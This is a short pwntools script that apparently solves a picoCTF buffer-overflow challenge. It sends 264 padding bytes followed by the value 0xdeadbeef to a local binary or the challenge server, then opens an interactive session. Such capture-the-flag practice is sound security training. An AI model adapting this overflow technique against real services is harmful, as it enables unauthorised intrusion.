from pwn import * 

exe = ELF("./chall")

context.binary = exe
def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("mars.picoctf.net", 31890)

    return r

def main():
	r = conn()
	input()
	payload = b'A'*264 + p64(0xdeadbeef)
	r.sendlineafter(b'What do you see?\n', payload)
	pause()
	r.interactive()
if __name__ == "__main__":
	main()